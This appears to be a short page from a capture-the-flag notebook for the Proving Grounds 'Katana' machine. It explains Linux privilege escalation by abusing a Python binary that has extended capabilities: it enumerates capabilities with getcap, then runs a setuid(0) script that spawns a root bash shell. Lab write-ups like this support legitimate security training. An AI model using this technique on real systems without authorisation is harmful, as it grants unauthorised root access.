---
layout: default
title: Python
parent: Extended Capabilities
nav_order: 2
---

# Python

---

## Check for extended capabilities

```bash
getcap -r / 2>/dev/null
```

![extend_cap](../../../../assets/images/ctfs/proving_grounds/katana/extend_cap.png)

Within the /tmp directory, create **priv.py** that does the following:

1. Sets the UID to 0
2. Generates a /bin/bash shell

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

Make **priv.py** executable and run with python2.7 to get root shell.

![root](../../../../assets/images/ctfs/proving_grounds/katana/root.png)
